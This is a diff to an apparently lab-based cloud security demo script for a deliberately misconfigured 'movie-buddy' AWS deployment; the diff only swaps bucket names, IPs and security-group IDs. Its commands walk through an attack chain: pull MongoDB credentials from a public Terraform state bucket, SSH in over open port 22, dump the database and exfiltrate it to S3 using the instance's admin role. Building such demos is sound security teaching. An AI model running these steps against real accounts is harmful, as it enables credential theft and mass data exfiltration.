@@ -206,7 +206,7 @@ But it was built with five intentional weaknesses — and I want to show they're
 
 ```bash
 # SSH open to the entire internet
-aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
   --query "SecurityGroups[0].IpPermissions" --output table
 
 # AdministratorAccess on the EC2 role
@@ -276,14 +276,14 @@ Security findings dashboard on dark navy background (#0a0e1a). Five tool labels 
 
 *(Open browser — navigate to the Terraform state bucket, no login required)*
 ```
-https://movie-buddy-tfstate-329153220664.s3.amazonaws.com/
+https://movie-buddy-tfstate-472151629584.s3.amazonaws.com/
 ```
 
 "This is the bucket that holds the Terraform state file. It's publicly readable — no credentials required, no AWS account needed. Just a browser. Watch what's inside."
 
 *(Run in terminal)*
 ```bash
-aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
+aws s3 cp s3://movie-buddy-tfstate-472151629584/wiz-exercise/terraform.tfstate - \
   | python3 -m json.tool | grep -A3 mongodb_url
 ```
 
@@ -291,7 +291,7 @@ aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate -
 
 *(Run in terminal — SSH into EC2)*
 ```bash
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128
 ```
 
 "Port 22 is open to the entire internet. I'm in. Now I dump the entire database — and to exfiltrate it, I don't need my own AWS credentials. The EC2 has AdministratorAccess attached. I just use the machine's own identity."
@@ -305,12 +305,12 @@ mongodump --host localhost --port 27017 \
 tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil
 
 aws s3 cp /tmp/movie_buddy_dump.tar.gz \
-  s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz
+  s3://movie-buddy-tfstate-472151629584/exfil/movie_buddy_dump.tar.gz
 ```
 
 *(Back in local terminal — confirm the dump landed)*
 ```bash
-aws s3 ls s3://movie-buddy-tfstate-329153220664/exfil/
+aws s3 ls s3://movie-buddy-tfstate-472151629584/exfil/
 ```
 
 "The entire customer database is now in S3 — staged using your own cloud account. No credentials of their own at any step.
@@ -444,20 +444,20 @@ print(json.dumps(docs, indent=2, default=str))
 ### MongoDB backups — prove automated backups are running
 ```bash
 # Show backup files exist in S3 (one per day since June 13)
-aws s3 ls s3://movie-buddy-db-backups/
+aws s3 ls s3://movie-buddy-db-backups-472151629584/
 
 # Show the backup script itself
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /usr/local/bin/backup-mongodb.sh"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "cat /usr/local/bin/backup-mongodb.sh"
 
 # Show the cron job that runs it at 2am daily
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "cat /etc/cron.d/mongodb-backup"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "cat /etc/cron.d/mongodb-backup"
 ```
 *(Have these ready if challenged — show the S3 listing proactively during the attack path demo)*
 
 ### Intentional weaknesses — live proof
 ```bash
 # SSH open to entire internet — show security group rule
-aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
   --query "SecurityGroups[0].IpPermissions" --output table
 
 # AdministratorAccess IAM role on EC2
@@ -473,16 +473,16 @@ kubectl get clusterrolebinding movie-buddy-cluster-admin -o yaml
 ### EC2 / MongoDB server
 ```bash
 # SSH to MongoDB server (demonstrates open SSH to internet — intentional weakness)
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128
 
 # Check MongoDB version (outdated — intentional)
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "mongod --version"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "mongod --version"
 
 # Check OS version (Ubuntu 20.04 — over 1 year outdated — intentional)
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237 "lsb_release -a"
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128 "lsb_release -a"
 
 # Show overly permissive security group (SSH open to 0.0.0.0/0)
-aws ec2 describe-security-groups --group-ids sg-03dce51e1f51d0137 \
+aws ec2 describe-security-groups --group-ids sg-0ee933abffae7854d \
   --query "SecurityGroups[0].IpPermissions" --output table
 
 # Show AdministratorAccess IAM policy attached to the EC2 role
@@ -495,19 +495,19 @@ aws iam list-attached-role-policies \
 ### Attack path demo — public S3 → credentials → SSH → full database exfiltration
 ```bash
 # Step 1: Show S3 bucket is publicly readable (open in browser, no credentials)
-# URL: https://movie-buddy-db-backups.s3.amazonaws.com/
+# URL: https://movie-buddy-db-backups-472151629584.s3.amazonaws.com/
 
 # Step 2: Show Terraform state file is in the public bucket
-aws s3 ls s3://movie-buddy-tfstate-329153220664/wiz-exercise/
+aws s3 ls s3://movie-buddy-tfstate-472151629584/wiz-exercise/
 
 # Step 3: Extract MongoDB credentials from state file (no auth required)
-aws s3 cp s3://movie-buddy-tfstate-329153220664/wiz-exercise/terraform.tfstate - \
+aws s3 cp s3://movie-buddy-tfstate-472151629584/wiz-exercise/terraform.tfstate - \
   | python3 -m json.tool | grep -A3 mongodb_url
 
 # Step 4: SSH into the EC2 server — SSH is open to the entire internet (second weakness)
 # Note: say out loud "In practice an attacker would brute-force this or exploit a MongoDB CVE.
 # The point is: port 22 is open to 0.0.0.0/0, so they can try."
-ssh -i wiz-exercise/wiz-exercise-key ubuntu@100.52.232.237
+ssh -i wiz-exercise/wiz-exercise-key ubuntu@44.201.2.128
 
 # Step 5 (run INSIDE the EC2 shell): Dump the entire database
 # Use 'mongo' not 'mongosh' — MongoDB 4.4 uses the old shell
@@ -519,9 +519,9 @@ mongodump --host localhost --port 27017 \
 # The EC2 has AdministratorAccess IAM role, so the AWS CLI just works (third weakness)
 tar -czf /tmp/movie_buddy_dump.tar.gz -C /tmp exfil
 aws s3 cp /tmp/movie_buddy_dump.tar.gz \
-  s3://movie-buddy-tfstate-329153220664/exfil/movie_buddy_dump.tar.gz
+  s3://movie-buddy-tfstate-472151629584/exfil/movie_buddy_dump.tar.gz
 
 # Step 7 (back in your local terminal): Confirm the dump landed in S3
-aws s3 ls s3://movie-buddy-tfstate-329153220664/exfil/
+aws s3 ls s3://movie-buddy-tfstate-472151629584/exfil/
 ```
 *(This chains THREE weaknesses: public S3 exposes credentials → open SSH port 22 provides server access → AdministratorAccess IAM role means no AWS credentials needed to exfiltrate. Say out loud: "An attacker with a browser, an SSH client, and the AWS CLI just dumped your entire customer database to external storage — using your own cloud account to do it.")*
